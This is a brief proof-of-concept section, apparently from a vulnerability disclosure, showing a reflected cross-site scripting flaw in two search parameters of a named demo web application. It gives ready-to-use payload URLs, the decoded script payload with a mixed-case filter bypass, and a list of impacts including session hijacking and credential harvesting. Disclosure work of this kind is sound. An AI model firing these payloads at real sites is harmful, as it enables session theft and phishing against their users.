## Proof of Concept

Vulnerable URLs (prior to patch):

```
https://demo.creativeitem.com/academy/blogs?search=1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(document.cookie)%3C/ScRiPt%3E

https://demo.creativeitem.com/academy/course_bundles/search/query?string=1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(document.cookie)%3C/ScRiPt%3E
```

**Payload (URL-decoded):**
```
1'"()&%<zzz><ScRiPt >alert(document.cookie)</ScRiPt>
```

- `1'"()&%<zzz>` — Context breaking characters
- `<ScRiPt >` — Filter bypass via mixed case + extra space
- `alert(document.cookie)` — Confirms JavaScript execution and cookie access

---

## Impact

- **Session Hijacking** — Steal session cookies via `document.cookie`
- **Credential Harvesting** — Inject fake login forms
- **Phishing** — Leverage trusted domain for social engineering
- **Content Manipulation** — Modify page content for victims
